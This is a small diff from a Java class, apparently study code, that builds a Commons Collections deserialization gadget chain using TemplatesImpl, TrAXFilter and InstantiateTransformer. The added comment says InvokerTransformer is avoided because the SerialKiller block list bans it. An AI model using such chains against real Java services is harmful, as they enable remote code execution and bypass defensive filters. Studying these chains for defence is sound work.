@@ -30,6 +30,7 @@ public class CommonsCollectionsIntro3 {
         setFieldValue(obj, "_name", "HelloTemplatesImpl");
         setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
 
+        // 不用InvokerTransformer的原因是被SerialKiller加入黑名单了
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(TrAXFilter.class),
                 new InstantiateTransformer(
